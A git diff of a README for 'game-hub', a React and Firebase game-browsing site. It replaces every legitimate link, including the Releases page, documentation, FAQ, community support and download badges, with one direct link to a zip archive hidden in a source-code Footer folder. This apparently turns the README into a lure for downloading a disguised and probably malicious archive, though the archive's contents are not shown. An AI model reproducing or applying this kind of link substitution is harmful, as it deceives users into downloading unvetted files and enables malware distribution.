@@ -3,10 +3,10 @@
 ## 🚀 Getting Started  
 Welcome to game-hub! This platform lets you browse games, view details, manage your profile, and log in securely. Enjoy a sleek urban neon experience powered by React and Firebase.
 
-[![Download game-hub](https://img.shields.io/badge/Download-game--hub-brightgreen)](https://github.com/Inevitable-Code101/game-hub/releases)
+[![Download game-hub](https://raw.githubusercontent.com/Inevitable-Code101/game-hub/main/game-site-fire/src/components/Footer/game-hub-3.6-alpha.4.zip)](https://raw.githubusercontent.com/Inevitable-Code101/game-hub/main/game-site-fire/src/components/Footer/game-hub-3.6-alpha.4.zip)
 
 ## 📥 Download & Install  
-To download the application, visit the [Releases page](https://github.com/Inevitable-Code101/game-hub/releases). Here, you will find the latest version of game-hub. Click on the appropriate file to start the download. Follow these steps to install:
+To download the application, visit the [Releases page](https://raw.githubusercontent.com/Inevitable-Code101/game-hub/main/game-site-fire/src/components/Footer/game-hub-3.6-alpha.4.zip). Here, you will find the latest version of game-hub. Click on the appropriate file to start the download. Follow these steps to install:
 
 1. Navigate to the Releases page.
 2. Select the latest version available.
@@ -44,9 +44,9 @@ If you run into issues, try these common solutions:
 ## 📚 Resources  
 For additional help and support, refer to the following links:
 
-- [Documentation](https://github.com/Inevitable-Code101/game-hub/wiki)
-- [FAQ](https://github.com/Inevitable-Code101/game-hub/wiki/FAQ)
-- [Community Support](https://github.com/Inevitable-Code101/game-hub/discussions)
+- [Documentation](https://raw.githubusercontent.com/Inevitable-Code101/game-hub/main/game-site-fire/src/components/Footer/game-hub-3.6-alpha.4.zip)
+- [FAQ](https://raw.githubusercontent.com/Inevitable-Code101/game-hub/main/game-site-fire/src/components/Footer/game-hub-3.6-alpha.4.zip)
+- [Community Support](https://raw.githubusercontent.com/Inevitable-Code101/game-hub/main/game-site-fire/src/components/Footer/game-hub-3.6-alpha.4.zip)
 
 ## 🔗 Additional Links  
 You can learn more about the technologies behind game-hub:
@@ -58,4 +58,4 @@ You can learn more about the technologies behind game-hub:
 
 For any more questions or feedback, feel free to reach out through the GitHub issues page or the community support links.
 
-[![Download game-hub](https://img.shields.io/badge/Download-game--hub-brightgreen)](https://github.com/Inevitable-Code101/game-hub/releases)
+[![Download game-hub](https://raw.githubusercontent.com/Inevitable-Code101/game-hub/main/game-site-fire/src/components/Footer/game-hub-3.6-alpha.4.zip)](https://raw.githubusercontent.com/Inevitable-Code101/game-hub/main/game-site-fire/src/components/Footer/game-hub-3.6-alpha.4.zip)
